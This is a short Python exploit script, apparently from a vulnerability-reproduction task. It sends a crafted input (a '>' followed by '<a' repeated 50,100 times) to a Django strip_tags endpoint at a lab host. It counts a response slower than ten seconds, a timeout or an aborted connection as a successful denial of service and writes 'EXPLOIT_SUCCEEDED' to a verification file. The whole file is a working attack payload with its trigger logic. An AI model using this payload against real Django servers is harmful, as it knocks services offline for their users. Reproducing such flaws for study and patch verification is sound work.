import requests
import sys
import time

url = 'http://django-app:8000/strip_tags/'

# Using the exact test case that triggers SuspiciousOperation
payload = ">" + "<a" * 50100  # First test case from the patch

print('=== REMOTE strip_tags timing ===', flush=True)
print(f"Input length: {len(payload)}", flush=True)
sys.stdout.flush()

try:
    print("Sending request...", flush=True)
    start_time = time.time()
    response = requests.post(
        url,
        data={'payload': payload},
        headers={'Content-Type': 'application/x-www-form-urlencoded'},
        timeout=20  # Increased timeout to 20 seconds
    )
    end_time = time.time()
    elapsed = end_time - start_time
    print(f"Got response: {response.status_code} in {elapsed:.2f} seconds", flush=True)
    
    # If we get here and the response took more than 10 seconds, consider it a success
    if elapsed > 10:
        print("Request took longer than 10 seconds - likely vulnerable!", flush=True)
        with open("../verify_files/exploit_output.txt", "w") as f:
            f.write("EXPLOIT_SUCCEEDED\n")
        sys.exit(0)

except requests.exceptions.Timeout:
    print("Request timed out after 20 seconds - this is what we want!", flush=True)
    with open("../verify_files/exploit_output.txt", "w") as f:
        f.write("EXPLOIT_SUCCEEDED\n")
    sys.exit(0)
except Exception as e:
    print(f"Error: {str(e)}", flush=True)
    elapsed = time.time() - start_time
    print(f"Error occurred after {elapsed:.2f} seconds", flush=True)
    # If connection was aborted after >10 seconds, that's a success too!
    if elapsed > 10 and ("Connection aborted" in str(e) or "RemoteDisconnected" in str(e)):
        print("Connection aborted after >10 seconds - this is what we want!", flush=True)
        with open("../verify_files/exploit_output.txt", "w") as f:
            f.write("EXPLOIT_SUCCEEDED\n")
        sys.exit(0) 